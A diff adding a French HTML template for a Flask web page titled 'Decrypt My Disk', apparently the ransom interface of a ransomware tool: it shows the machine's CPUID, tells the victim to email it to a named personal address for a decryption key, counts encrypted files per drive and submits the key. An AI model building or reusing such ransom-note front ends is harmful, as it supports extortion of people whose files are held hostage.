@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <title>Decrypt My Disk</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!--===============================================================================================-->
+    <link rel="icon" type="image/png" href="{{ url_for('static', filename = 'images/icons/favicon.ico') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/bootstrap.min.css') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/font-awesome.min.css') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/animate.css') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/hamburgers.min.css') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/select2.min.css') }}">
+    <!--===============================================================================================-->
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/util.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/main.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/particle.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/error_modal.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/success_modal.css') }}">
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename = 'css/material-icons.css') }}">
+    <!--===============================================================================================-->
+</head>
+
+<body>
+    <div id="particles-js">
+    </div>
+    <!-- Modal -->
+
+    <!-- Welcome Modal -->
+    <div class="modal fade" id="welcomeModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle"
+        aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered" role="document">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <p> CPUID : <strong>{{ cpuID }}</strong></p>
+                    <p>Envoyer votre CPUID à l'adresse email <strong>mig.razafimanjato@gmail.com</strong> pour obtenir
+                        votre clé de décryptage</p>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Password Error Modal -->
+    <div id="passwordErorModal" class="modal fade">
+        <div class="modal-dialog modal-confirm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div class="icon-box">
+                        <i class="material-icons">&#xE5CD;</i>
+                    </div>
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                </div>
+                <div class="modal-body text-center">
+                    <h4>Ooops!</h4>
+                    <p>Clé de décryptage incorrecte.</p>
+                    <button class="btn btn-success" data-dismiss="modal">Réessayer</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Host Error Modal -->
+    <div id="hostErrorModal" class="modal fade">
+        <div class="modal-dialog modal-confirm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <div class="icon-box">
+                        <i class="material-icons">&#xE5CD;</i>
+                    </div>
+                    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
+                </div>
+                <div class="modal-body text-center">
+                    <h4>Erreur de l'hôte !</h4>
+                    <p>Les fichiers doivent être décryptés par l'ordinateur qui a effectué le cryptage</p>
+                    <button class="btn btn-success" data-dismiss="modal">Réessayer</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="sucess-modal modal fade">
+        <div class="sucess-modal modal-dialog modal-confirm">
+            <div class="sucess-modal modal-content">
+                <div class="sucess-modal modal-header">
+                    <div class="sucess-modal icon-box">
+                        <i class="sucess-modal material-icons">&#xE876;</i>
+                    </div>
+                    <button type="button" class="sucess-modal close" data-dismiss="modal"
+                        aria-hidden="true">&times;</button>
+                </div>
+                <div class="sucess-modal modal-body text-center">
+                    <h4>Great!</h4>
+                    <p>Tous les données cryptées dans votre disque ont été décryptées</p>
+                    <button class="sucess-modal btn btn-success" data-dismiss="modal"><span>Continuer</span> <i
+                            class="sucess-modal material-icons">&#xE5C8;</i></button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="limiter">
+        <div class="container-login100">
+            <div class="wrap-login100">
+                <span class="login100-form-title2"> </span>
+                <div>
+
+                    <div class="dropdown">
+                        <button class="btn btn-secondary dropdown-toggle" type="button" id="dropdownMenuButton"
+                            data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                            Selectionner le disque
+                        </button>
+                        <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+                            {% for drive in drives %}
+                            <a class="dropdown-item" href="#">{{ drive }}</a>
+                            {% endfor %}
+                        </div>
+                    </div>
+                    <br><br>
+                    <p>Nombre de fihiers cryptés dans <span id="selectedDrive"> {{ current_drive }}</span> <strong
+                            id="cryptedFilesLength">{{ crypted_files_length }}</strong></p>
+                </div>
+
+                <form class="login100-form validate-form" method="post" action="/users/register">
+                    <div class="wrap-input100 validate-input" data-validate="Clé nécessaire">
+                        <input class="input100" type="text" name="password2" placeholder="" id="key">
+                        <span class="focus-input100" data-placeholder="Clé de décryptage"></span>
+                        <span class="symbol-input100">
+                        </span>
+                    </div>
+
+                    <div class="container-login100-form-btn">
+                        <div class="wrap-login100-form-btn">
+                            <div class="login100-form-bgbtn"></div>
+                            <button class="login100-form-btn" id="process">
+                                Lancer le décryptage !
+                            </button>
+                        </div>
+                    </div>
+
+                </form>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="{{ url_for('static', filename = 'js/axios.min.js') }}"></script>
+    <script src="{{ url_for('static', filename = 'js/particles.js') }}"></script>
+    <script src="{{ url_for('static', filename = 'js/app.js') }}"></script>
+
+
+    <!--===============================================================================================-->
+    <script src="{{ url_for('static', filename = 'js/jquery-3.2.1.min.js') }}"></script>
+    <!--===============================================================================================-->
+    <script src="{{ url_for('static', filename = 'js/popper.js') }}"></script>
+    <script src="{{ url_for('static', filename = 'js/bootstrap.min.js') }}"></script>
+    <!--===============================================================================================-->
+    <script src="{{ url_for('static', filename = 'js/select2.min.js') }}"></script>
+    <!--===============================================================================================-->
+
+    <!--===============================================================================================-->
+    <script src="{{ url_for('static', filename = 'js/bootstrap-waitingfor.js') }}"></script>
+    <script src="{{ url_for('static', filename = 'js/main.js') }}"></script>
+    <script>
+
+
+        var elem = document.documentElement;
+
+        /* View in fullscreen */
+        function openFullscreen() {
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.mozRequestFullScreen) { /* Firefox */
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                elem.msRequestFullscreen();
+            }
+        }
+
+        /* Close fullscreen */
+        function closeFullscreen() {
+            if (document.exitFullscreen) {
+                document.exitFullscreen();
+            } else if (document.mozCancelFullScreen) { /* Firefox */
+                document.mozCancelFullScreen();
+            } else if (document.webkitExitFullscreen) { /* Chrome, Safari and Opera */
+                document.webkitExitFullscreen();
+            } else if (document.msExitFullscreen) { /* IE/Edge */
+                document.msExitFullscreen();
+            }
+        }
+
+        // elem.addEventListener('click', function () {
+        //     openFullscreen()
+        // })
+        $(function () {
+            $('#welcomeModal').modal('show')
+
+            $(".dropdown-menu a").click(function () {
+                selectedDriveValue = $(".btn:first-child").val($(this).text())['0'].value
+                axios.post('/changeSelectedDrive', {
+                    drive: selectedDriveValue
+                })
+                    .then(function (response) {
+                        var cryptedFilesLengthResponse = response.data.crypted_files_length
+                        var selectedDriveSpan = document.getElementById('selectedDrive')
+                        var cryptedFilesLengthSpan = document.getElementById('cryptedFilesLength')
+
+                        selectedDriveSpan.innerText = selectedDriveValue
+                        cryptedFilesLengthSpan.innerText = cryptedFilesLengthResponse
+                    })
+                // console.log($(".btn:first-child").text($(this).text()));
+            });
+
+
+
+            var processButton = document.getElementById('process')
+            processButton.addEventListener('click', function (e) {
+                e.preventDefault()
+                var selectedDriveSpan = document.getElementById('selectedDrive')
+                var keyValue = document.getElementById("key").value;
+                waitingDialog.show('Décryptage en cours...');
+                console.log({
+                    drive: selectedDrive,
+                    key: keyValue
+                })
+                axios.post('/decrypt', {
+                    drive: selectedDriveSpan.innerText,
+                    key: keyValue
+                })
+                    .then(function (response) {
+                        waitingDialog.hide();
+                        if (response.data.error) {
+                        waitingDialog.hide();
+                            switch (response.data.type) {
+                                case "HOST_INVALID":
+                                    $('#hostErrorModal').modal('show')
+                                    break;
+                                case "KEY_INVALID":
+                                    $('#passwordErorModal').modal('show')
+                                    break;
+                            }
+                        } else {
+                            $('#successModal').modal('show')
+                        }
+                    })
+            })
+
+        });
+    </script>
+</body>
+
+</html>
